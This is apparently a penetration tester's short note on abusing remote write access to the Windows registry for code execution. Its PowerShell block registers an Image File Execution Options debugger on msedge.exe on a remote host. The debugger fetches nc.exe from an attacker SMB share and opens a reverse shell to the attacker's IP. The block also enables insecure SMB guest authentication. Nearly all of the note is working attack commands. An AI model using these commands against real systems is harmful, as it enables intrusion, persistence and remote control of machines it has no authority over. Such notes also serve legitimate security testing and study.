---
tags:
  - tool
---
# winreg

Having remote access to the registry with write permissions effectively provides Remote Code Execution (RCE) capabilities.

## Capabilities

```powershell
# Execute payload once msedge.exe is executed
reg.exe add '\\$FQDN\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe" /v Debugger /t reg_sz /d "cmd /c copy \\$OUR_IP\share\nc.exe && nc.exe -e \windows\system32\cmd.exe $OUR_IP $PORT'

# Check if SMB guest authentication is enabled
reg.exe query HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth

# Enable SMB without authentication
reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /d 1 /t REG_DWORD /f
```
